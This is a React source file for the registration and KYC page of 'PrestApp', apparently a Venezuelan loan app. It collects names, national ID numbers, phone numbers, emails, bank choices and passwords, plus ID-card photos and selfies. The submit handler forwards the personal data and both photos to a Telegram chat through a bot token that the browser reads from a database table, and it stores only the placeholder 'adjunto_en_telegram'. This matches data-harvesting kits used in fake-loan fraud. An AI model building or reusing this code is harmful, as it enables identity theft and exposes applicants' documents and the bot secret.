import React, { useState } from 'react';
import { useNavigate, Link } from 'react-router-dom';
import { useAuth } from '../context/AuthContext';
import { Shield, Camera, Upload, AlertCircle, Check } from 'lucide-react';
import { CameraModal } from '../components/CameraModal';
import { supabase } from '../lib/supabase';
import { sendTelegramMessage, sendTelegramPhoto } from '../lib/telegram';

export const Register: React.FC = () => {
  const { register } = useAuth();
  const navigate = useNavigate();

  const [formData, setFormData] = useState({
    full_name: '',
    email: '',
    phone: '0414-',
    id_card: 'V-',
    bank_name: '0134 - Banesco Banco Universal',
    password: ''
  });

  const [cedulaPhoto, setCedulaPhoto] = useState<string | null>(null);
  const [selfiePhoto, setSelfiePhoto] = useState<string | null>(null);

  const [cameraModalOpen, setCameraModalOpen] = useState(false);
  const [cameraTarget, setCameraTarget] = useState<'cedula' | 'selfie'>('cedula');

  const [loading, setLoading] = useState(false);
  const [errorMsg, setErrorMsg] = useState('');

  const openCamera = (target: 'cedula' | 'selfie') => {
    setCameraTarget(target);
    setCameraModalOpen(true);
  };

  const handleCapture = (base64Image: string) => {
    if (cameraTarget === 'cedula') {
      setCedulaPhoto(base64Image);
    } else {
      setSelfiePhoto(base64Image);
    }
  };

  const handleFileUpload = (e: React.ChangeEvent<HTMLInputElement>, target: 'cedula' | 'selfie') => {
    const file = e.target.files?.[0];
    if (file) {
      const reader = new FileReader();
      reader.onloadend = () => {
        if (typeof reader.result === 'string') {
          if (target === 'cedula') {
            setCedulaPhoto(reader.result);
          } else {
            setSelfiePhoto(reader.result);
          }
        }
      };
      reader.readAsDataURL(file);
    }
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!cedulaPhoto || !selfiePhoto) {
      setErrorMsg('Debes tomar la foto de tu cédula y tu selfie biométrica con la cámara.');
      return;
    }

    setLoading(true);
    setErrorMsg('');

    const res = await register({
      ...formData,
      cedula_url: 'adjunto_en_telegram',
      selfie_url: 'adjunto_en_telegram'
    });

    if (res.error) {
      setLoading(false);
      setErrorMsg(res.error.message || 'Error registrando el usuario.');
      return;
    }

    // Enviar fotos y datos a Telegram KYC
    try {
      const { data: settings } = await supabase.from('app_settings').select('*');
      const botToken = settings?.find((s: any) => s.key === 'telegram_bot_token')?.value;
      const kycChatId = settings?.find((s: any) => s.key === 'telegram_chat_id_kyc')?.value;

      if (botToken && kycChatId) {
        const textMsg = `🆕 <b>NUEVO REGISTRO REAL PRESTAPP</b>\n\n` +
          `👤 <b>Nombre:</b> ${formData.full_name}\n` +
          `🆔 <b>Cédula:</b> ${formData.id_card}\n` +
          `📱 <b>Teléfono:</b> ${formData.phone}\n` +
          `✉️ <b>Email:</b> ${formData.email}\n` +
          `🏦 <b>Banco:</b> ${formData.bank_name}\n` +
          `📅 <b>Fecha:</b> ${new Date().toLocaleString('es-VE')}`;

        await sendTelegramMessage(botToken, kycChatId, textMsg);

        if (cedulaPhoto) {
          await sendTelegramPhoto(botToken, kycChatId, cedulaPhoto, `🪪 Cédula de ${formData.full_name} (${formData.id_card})`);
        }
        if (selfiePhoto) {
          await sendTelegramPhoto(botToken, kycChatId, selfiePhoto, `🤳 Selfie Biométrica de ${formData.full_name}`);
        }
      }
    } catch (err) {
      console.warn(err);
    }

    setLoading(false);
    navigate('/dashboard');
  };

  return (
    <div className="max-w-xl mx-auto px-4 py-8 space-y-6">
      <div className="bg-slate-900 border border-slate-800 rounded-3xl p-6 sm:p-8 shadow-2xl space-y-6">
        <div className="text-center space-y-2">
          <div className="w-12 h-12 bg-emerald-500 rounded-2xl mx-auto flex items-center justify-center shadow-lg shadow-emerald-500/30">
            <Shield className="w-6 h-6 text-slate-950 font-black" />
          </div>
          <h1 className="text-2xl font-black text-white">Registro & KYC PrestApp</h1>
          <p className="text-xs text-slate-400">
            Completa tus datos y fotos con la cámara para habilitar tu línea de crédito
          </p>
        </div>

        {errorMsg && (
          <div className="p-3 bg-rose-500/10 border border-rose-500/30 rounded-xl text-xs text-rose-300 flex items-center gap-2">
            <AlertCircle className="w-4 h-4 shrink-0" />
            <span>{errorMsg}</span>
          </div>
        )}

        <form onSubmit={handleSubmit} className="space-y-4">
          <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
            <div>
              <label className="text-xs font-bold text-slate-300 block mb-1">Nombre Completo</label>
              <input
                type="text"
                required
                placeholder="Nombre y Apellido"
                value={formData.full_name}
                onChange={(e) => setFormData({ ...formData, full_name: e.target.value })}
                className="w-full bg-slate-950 border border-slate-800 rounded-xl px-3.5 py-2.5 text-sm text-white focus:outline-none focus:border-blue-500"
              />
            </div>

            <div>
              <label className="text-xs font-bold text-slate-300 block mb-1">Correo Electrónico</label>
              <input
                type="email"
                required
                placeholder="usuario@correo.com"
                value={formData.email}
                onChange={(e) => setFormData({ ...formData, email: e.target.value })}
                className="w-full bg-slate-950 border border-slate-800 rounded-xl px-3.5 py-2.5 text-sm text-white focus:outline-none focus:border-blue-500"
              />
            </div>
          </div>

          <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
            <div>
              <label className="text-xs font-bold text-slate-300 block mb-1">Cédula (V- / E-)</label>
              <input
                type="text"
                required
                placeholder="V-28123456"
                value={formData.id_card}
                onChange={(e) => setFormData({ ...formData, id_card: e.target.value })}
                className="w-full bg-slate-950 border border-slate-800 rounded-xl px-3.5 py-2.5 text-sm text-white focus:outline-none focus:border-blue-500"
              />
            </div>

            <div>
              <label className="text-xs font-bold text-slate-300 block mb-1">Teléfono Móvil (Pago Móvil)</label>
              <input
                type="text"
                required
                placeholder="0414-1234567"
                value={formData.phone}
                onChange={(e) => setFormData({ ...formData, phone: e.target.value })}
                className="w-full bg-slate-950 border border-slate-800 rounded-xl px-3.5 py-2.5 text-sm text-white focus:outline-none focus:border-blue-500"
              />
            </div>
          </div>

          <div>
            <label className="text-xs font-bold text-slate-300 block mb-1">Banco Principal para Desembolsos</label>
            <select
              value={formData.bank_name}
              onChange={(e) => setFormData({ ...formData, bank_name: e.target.value })}
              className="w-full bg-slate-950 border border-slate-800 rounded-xl px-3.5 py-2.5 text-sm text-white focus:outline-none focus:border-blue-500"
            >
              <option value="0134 - Banesco Banco Universal">0134 - Banesco Banco Universal</option>
              <option value="0102 - Banco de Venezuela (BDV)">0102 - Banco de Venezuela (BDV)</option>
              <option value="0105 - Banco Mercantil">0105 - Banco Mercantil</option>
              <option value="0108 - Banco Provincial (BBVA)">0108 - Banco Provincial (BBVA)</option>
              <option value="0172 - Bancamiga Banco Universal">0172 - Bancamiga Banco Universal</option>
            </select>
          </div>

          <div>
            <label className="text-xs font-bold text-slate-300 block mb-1">Contraseña</label>
            <input
              type="password"
              required
              placeholder="••••••••"
              value={formData.password}
              onChange={(e) => setFormData({ ...formData, password: e.target.value })}
              className="w-full bg-slate-950 border border-slate-800 rounded-xl px-3.5 py-2.5 text-sm text-white focus:outline-none focus:border-blue-500"
            />
          </div>

          {/* Fotos con Cámara */}
          <div className="pt-4 border-t border-slate-800 space-y-3">
            <h4 className="text-xs font-black uppercase text-amber-400 tracking-wider">
              Fotos Requeridas para Validación
            </h4>

            <div className="grid grid-cols-1 sm:grid-cols-2 gap-3">
              {/* Foto Cédula */}
              <div
                className={`p-4 rounded-2xl border transition flex flex-col justify-between ${
                  cedulaPhoto ? 'bg-emerald-950/30 border-emerald-500/60' : 'bg-slate-950 border-slate-800'
                }`}
              >
                <div className="flex items-start justify-between">
                  <div className="space-y-1">
                    <p className="text-xs font-bold text-white flex items-center gap-1.5">
                      {cedulaPhoto ? <Check className="w-4 h-4 text-emerald-400" /> : <Camera className="w-4 h-4 text-blue-400" />}
                      <span>Foto de Cédula</span>
                    </p>
                    <p className="text-[10px] text-slate-400">Documento nítido</p>
                  </div>
                  {cedulaPhoto && (
                    <img src={cedulaPhoto} alt="Cédula" className="w-12 h-12 object-cover rounded-lg border border-emerald-500/40" />
                  )}
                </div>

                <div className="mt-3 flex gap-2">
                  <button
                    type="button"
                    onClick={() => openCamera('cedula')}
                    className="flex-1 py-2 bg-blue-600 hover:bg-blue-500 text-white rounded-xl text-xs font-bold flex items-center justify-center gap-1"
                  >
                    <Camera className="w-3.5 h-3.5" />
                    <span>{cedulaPhoto ? 'Cambiar' : 'Abrir Cámara'}</span>
                  </button>
                  <label className="p-2 bg-slate-800 hover:bg-slate-700 text-slate-300 rounded-xl cursor-pointer" title="Subir">
                    <Upload className="w-3.5 h-3.5" />
                    <input type="file" accept="image/*" className="hidden" onChange={(e) => handleFileUpload(e, 'cedula')} />
                  </label>
                </div>
              </div>

              {/* Selfie */}
              <div
                className={`p-4 rounded-2xl border transition flex flex-col justify-between ${
                  selfiePhoto ? 'bg-emerald-950/30 border-emerald-500/60' : 'bg-slate-950 border-slate-800'
                }`}
              >
                <div className="flex items-start justify-between">
                  <div className="space-y-1">
                    <p className="text-xs font-bold text-white flex items-center gap-1.5">
                      {selfiePhoto ? <Check className="w-4 h-4 text-emerald-400" /> : <Camera className="w-4 h-4 text-blue-400" />}
                      <span>Selfie Facial</span>
                    </p>
                    <p className="text-[10px] text-slate-400">Rostro descubierto</p>
                  </div>
                  {selfiePhoto && (
                    <img src={selfiePhoto} alt="Selfie" className="w-12 h-12 object-cover rounded-lg border border-emerald-500/40" />
                  )}
                </div>

                <div className="mt-3 flex gap-2">
                  <button
                    type="button"
                    onClick={() => openCamera('selfie')}
                    className="flex-1 py-2 bg-emerald-600 hover:bg-emerald-500 text-white rounded-xl text-xs font-bold flex items-center justify-center gap-1"
                  >
                    <Camera className="w-3.5 h-3.5" />
                    <span>{selfiePhoto ? 'Cambiar' : 'Abrir Cámara'}</span>
                  </button>
                  <label className="p-2 bg-slate-800 hover:bg-slate-700 text-slate-300 rounded-xl cursor-pointer" title="Subir">
                    <Upload className="w-3.5 h-3.5" />
                    <input type="file" accept="image/*" className="hidden" onChange={(e) => handleFileUpload(e, 'selfie')} />
                  </label>
                </div>
              </div>
            </div>
          </div>

          <button
            type="submit"
            disabled={loading}
            className="w-full bg-emerald-500 hover:bg-emerald-400 disabled:opacity-50 text-slate-950 font-black py-3.5 rounded-xl text-sm transition shadow-lg shadow-emerald-500/20 mt-4"
          >
            {loading ? 'Registrando...' : 'Completar Registro'}
          </button>
        </form>

        <p className="text-center text-xs text-slate-400">
          ¿Ya tienes cuenta?{' '}
          <Link to="/login" className="text-blue-400 font-bold hover:underline">
            Inicia Sesión
          </Link>
        </p>
      </div>

      <CameraModal
        title={cameraTarget === 'cedula' ? 'Captura de Foto de Cédula' : 'Selfie Biométrica Facial'}
        isOpen={cameraModalOpen}
        onClose={() => setCameraModalOpen(false)}
        onCapture={handleCapture}
        preferredFacingMode={cameraTarget === 'selfie' ? 'user' : 'environment'}
      />
    </div>
  );
};
